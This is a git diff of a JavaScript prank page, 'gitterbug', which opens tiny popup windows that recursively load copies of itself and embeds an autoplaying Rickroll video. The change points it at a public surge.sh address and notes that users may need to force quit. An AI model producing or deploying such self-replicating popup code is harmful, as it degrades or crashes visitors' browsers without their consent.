@@ -20,20 +20,19 @@ document.addEventListener('DOMContentLoaded', e => {
     p.innerText = "( ͡° ͜ʖ ͡°) Let's do the gitterbug ( ͡° ͜ʖ ͡°)";
     document.getElementById('rickHere').appendChild(p);
     //RickRoll
-    for (let i = 0; i < it; i++) {
-      theLegend = document.createElement('iframe');
-      theLegend.setAttribute('width', '50');
-      theLegend.setAttribute('height', '50');
-      theLegend.setAttribute('src', 'https://www.youtube.com/embed/oHg5SJYRHA0?controls=0&amp;start=1;autoplay=1');
-      theLegend.setAttribute('frameborder', '0');
-      theLegend.setAttribute('allow', 'autoplay');
-      document.getElementById('rickHere').appendChild(theLegend);
-    }
+    theLegend = document.createElement('iframe');
+    theLegend.setAttribute('width', '50');
+    theLegend.setAttribute('height', '50');
+    theLegend.setAttribute('src', 'https://www.youtube.com/embed/oHg5SJYRHA0?controls=0&amp;start=1;autoplay=1');
+    theLegend.setAttribute('frameborder', '0');
+    theLegend.setAttribute('allow', 'autoplay');
+    document.getElementById('rickHere').appendChild(theLegend);
   };
 
   /**
    * Runner that inits all the terrible.
    * @param {number} it number of iterations for a new window to appear.
+   * The higher this number the more like you are to need to force quit
    */
   const runner = (winName, it) => {
     /**
@@ -43,7 +42,7 @@ document.addEventListener('DOMContentLoaded', e => {
 
     for (let i = 0; i < it; i++) {
       // Windows need to be named differently to exist as multiples.
-      owo.push(window.open(`http://localhost:3000`, `${winName}${i}`, 'width=100,height=100'));
+      owo.push(window.open(`https://gitterbug.surge.sh`, `${winName}${i}`, 'width=100,height=100'));
     }
 
     addBunch_o_shizTo_newWindow(it);
@@ -72,17 +71,13 @@ document.addEventListener('DOMContentLoaded', e => {
    * It will load tiny copies of itself that start loading tiny copies of
    * themselves.
    */
-  const dispatch = () => {
-    runner(`${getRand()}`, 1);
-    document.getElementById('begin').addEventListener('click', ev => {
-        runner(`${getRand()}`, 1)
-      });
-    document.addEventListener('keydown', eve => {
-      runner(`${getRand()}`, 1)
-    })
+  const dispatch = o => {
+    document.getElementById('begin').addEventListener('click', ev => { runner(`${getRand()}`, o); });
+    document.addEventListener('keydown', eve => { runner(`${getRand()}`, o); });
+    runner(`${getRand()}`, o);
   }
   /**
    * Go.
    */
-  dispatch();
+  dispatch(1);
 })
